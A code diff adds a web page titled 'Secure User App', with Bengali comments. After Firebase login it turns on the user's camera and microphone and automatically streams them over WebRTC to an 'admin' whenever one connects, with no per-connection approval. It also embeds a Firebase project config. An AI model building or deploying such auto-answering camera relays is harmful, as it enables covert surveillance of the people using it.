@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure User App</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-auth.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <script src="https://unpkg.com/simple-peer@9.11.1/simplepeer.min.js"></script>
+    <style>
+        body { background: #111; color: white; font-family: sans-serif; text-align: center; padding: 20px; }
+        input { padding: 10px; margin: 5px; width: 80%; border-radius: 5px; border: none; }
+        button { padding: 10px 20px; margin: 10px; cursor: pointer; background: #00ffcc; border: none; font-weight: bold; border-radius: 5px; }
+        button:hover { background: #00ccaa; }
+        
+        /* পেজ লুকানো/দেখানোর জন্য */
+        #cameraSection { display: none; } 
+        #authSection { margin-top: 50px; }
+        
+        video { width: 90%; border: 3px solid #00ffcc; border-radius: 10px; transform: scaleX(-1); margin-top: 20px; }
+        .status { color: yellow; margin-top: 10px; }
+    </style>
+</head>
+<body>
+
+    <div id="authSection">
+        <h2>🔐 Login / Register</h2>
+        <input type="email" id="email" placeholder="Enter Email"><br>
+        <input type="password" id="password" placeholder="Enter Password"><br>
+        <button onclick="registerUser()">Create Account</button>
+        <button onclick="loginUser()">Login</button>
+        <p id="authMsg" style="color: red;"></p>
+    </div>
+
+    <div id="cameraSection">
+        <h3>ID: <span id="userIdDisplay" style="color: #00ffcc;">...</span></h3>
+        <video id="localVideo" autoplay playsinline muted></video>
+        <div class="status" id="statusText">System Active. Waiting for Admin...</div>
+        <button onclick="logout()" style="background: red; color: white;">Logout</button>
+    </div>
+
+    <script>
+        // তোর দেওয়া কনফিগারেশন
+        const firebaseConfig = {
+          apiKey: "AIzaSyBy5AGDGQFZqbL83fKQfLViX_pyOu6AJ38",
+          authDomain: "phone-f605e.firebaseapp.com",
+          databaseURL: "https://phone-f605e-default-rtdb.firebaseio.com",
+          projectId: "phone-f605e",
+          storageBucket: "phone-f605e.firebasestorage.app",
+          messagingSenderId: "902490805880",
+          appId: "1:902490805880:web:98a5ed1432a0e3538e3f8d",
+          measurementId: "G-WSJDCYKM3F"
+        };
+
+        if (!firebase.apps.length) {
+            firebase.initializeApp(firebaseConfig);
+        }
+        const auth = firebase.auth();
+        const db = firebase.database();
+
+        // --- অথেনটিফিকেশন লজিক ---
+
+        // ১. একাউন্ট তৈরি করা
+        function registerUser() {
+            const email = document.getElementById("email").value;
+            const pass = document.getElementById("password").value;
+            
+            auth.createUserWithEmailAndPassword(email, pass)
+                .then((userCredential) => {
+                    alert("Account Created! Camera Starting...");
+                })
+                .catch((error) => {
+                    document.getElementById("authMsg").innerText = error.message;
+                });
+        }
+
+        // ২. লগইন করা
+        function loginUser() {
+            const email = document.getElementById("email").value;
+            const pass = document.getElementById("password").value;
+
+            auth.signInWithEmailAndPassword(email, pass)
+                .catch((error) => {
+                    document.getElementById("authMsg").innerText = error.message;
+                });
+        }
+
+        // ৩. লগআউট করা
+        function logout() {
+            auth.signOut().then(() => location.reload());
+        }
+
+        // ৪. ইউজার লগইন আছে কিনা চেক করা (মেইন লজিক)
+        auth.onAuthStateChanged((user) => {
+            if (user) {
+                // ইউজার লগইন থাকলে লগইন পেজ লুকাও, ক্যামেরা দেখাও
+                document.getElementById("authSection").style.display = "none";
+                document.getElementById("cameraSection").style.display = "block";
+                document.getElementById("userIdDisplay").innerText = user.email;
+                
+                // ক্যামেরা চালু কর
+                startCameraSystem(user.uid, user.email);
+            } else {
+                // ইউজার লগআউট থাকলে
+                document.getElementById("authSection").style.display = "block";
+                document.getElementById("cameraSection").style.display = "none";
+            }
+        });
+
+        // --- ক্যামেরা এবং ডাটাবেজ লজিক ---
+        
+        function startCameraSystem(uid, email) {
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true })
+            .then(stream => {
+                document.getElementById("localVideo").srcObject = stream;
+                
+                // ডাটাবেজে আপডেট: আমি অনলাইনে আছি
+                db.ref("users/" + uid).set({
+                    email: email,
+                    status: "online",
+                    lastSeen: Date.now()
+                });
+
+                // ডিসকানেক্ট হলে অফলাইন দেখাবে
+                db.ref("users/" + uid).onDisconnect().update({
+                    status: "offline"
+                });
+
+                // এডমিনের সিগন্যাল রিসিভ করা
+                db.ref("users/" + uid + "/offer").on("value", snapshot => {
+                    const offer = snapshot.val();
+                    if (offer) {
+                        document.getElementById("statusText").innerText = "⚠️ Admin Connected!";
+                        
+                        const peer = new SimplePeer({ initiator: false, trickle: false, stream: stream });
+                        peer.signal(offer);
+
+                        peer.on('signal', answer => {
+                            db.ref("users/" + uid + "/answer").set(answer);
+                        });
+                    }
+                });
+            })
+            .catch(err => alert("Camera Error: " + err));
+        }
+
+    </script>
+</body>
+</html>
